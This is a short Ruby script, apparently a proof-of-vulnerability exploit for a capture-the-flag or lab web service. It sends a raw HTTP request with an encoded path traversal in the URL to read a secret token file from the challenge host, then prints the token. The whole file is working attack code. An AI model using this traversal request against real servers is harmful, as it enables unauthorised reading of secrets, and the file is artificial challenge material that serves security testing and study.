#!/bin/env ruby

require "logger"

require "socket"

LLL = Logger.new(STDERR,
                 formatter: proc do |sev, datetime, progname, msg|
                   "#{sev}: #{msg}\n"
                 end)

MAX_PIN =  0xffffffffffffffff

class Pov
  attr_reader :host, :port


  def initialize
    @host = ENV['HOST'] || 'challenge'
    @port = ENV['PORT'] || '3013'
  end

  def run!
    last_line = nil
    TCPSocket.open(@host, @port) do |sock|
      sock.write "GET /tweets/%2e%2e%2f%2e%2e%2ftoken/photo HTTP/1.1\r\n"
      sock.write "Host: #{@host}\r\n"
      sock.write "Connection: close\r\n"
      sock.write "\r\n"

      loop do
        got = sock.gets
        break if got.nil?
        last_line = got.strip
      end
    end
    puts "TOKEN=#{last_line}"
  end

  private

  def assert_equal(expected, actual)
    assert(expected == actual, "expected #{expected} to == #{actual}")
  end

  def assert(predicate, message='failed assertion')
    return if predicate
    fail message
  end
end

pov = Pov.new
at_exit do
  LLL.info((["ruby", $0] + ARGV).join(' '))
end
pov.run!

LLL.info "success :)"
